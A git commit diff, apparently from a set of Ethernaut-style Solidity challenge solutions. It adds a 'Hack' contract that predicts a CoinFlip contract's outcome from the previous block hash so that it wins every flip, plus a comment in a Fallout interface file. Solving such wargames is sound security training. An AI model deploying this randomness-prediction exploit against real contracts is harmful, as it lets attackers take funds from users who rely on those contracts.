ead009e4b209ee73a02a1a3e0ecbdfb8723e5717
t4sk <tsk.nakamura@gmail.com>
2022-11-10 09:18:37 +0900

    3

--- src/02-fallout.sol
+++ src/02-fallout.sol
@@ -2,5 +2,6 @@ pragma solidity ^0.8;
 
 interface IFallout {
     function owner() external view returns (address);
+    // call this function
     function Fal1out() external payable;
 }
---
+++ src/03-coin-flip.sol
@@ -0,0 +1,29 @@
+pragma solidity ^0.8;
+
+interface ICoinFlip {
+    function consecutiveWins() external view returns (uint);
+    function flip(bool) external returns (bool);
+}
+
+contract Hack {
+    ICoinFlip private immutable target;
+    uint private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+
+    constructor(address _target) {
+        target = ICoinFlip(_target);
+    }
+
+    // call this function 10 times
+    function flip() external {
+        bool guess = _guess();
+        require(target.flip(guess), "guess failed");
+    }
+
+    function _guess() private view returns (bool) {
+        uint blockValue = uint256(blockhash(block.number - 1));
+
+        uint coinFlip = blockValue / FACTOR;
+        return coinFlip == 1 ? true : false;
+    }
+}
